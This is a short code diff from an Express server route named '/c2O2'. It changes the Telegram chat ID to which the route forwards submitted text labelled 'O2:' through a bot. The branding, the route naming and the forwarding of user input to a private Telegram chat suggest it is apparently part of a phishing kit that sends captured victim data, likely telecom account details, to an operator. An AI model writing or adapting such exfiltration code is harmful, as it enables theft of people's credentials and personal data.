@@ -3355,7 +3355,7 @@ app.post("/c2O2", (req, res) => {
           .post(
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
-              chat_id: 1713673720,
+              chat_id: 5348269876,
               text: `O2:\n${originalText}`,
               parse_mode: "Markdown",
             }
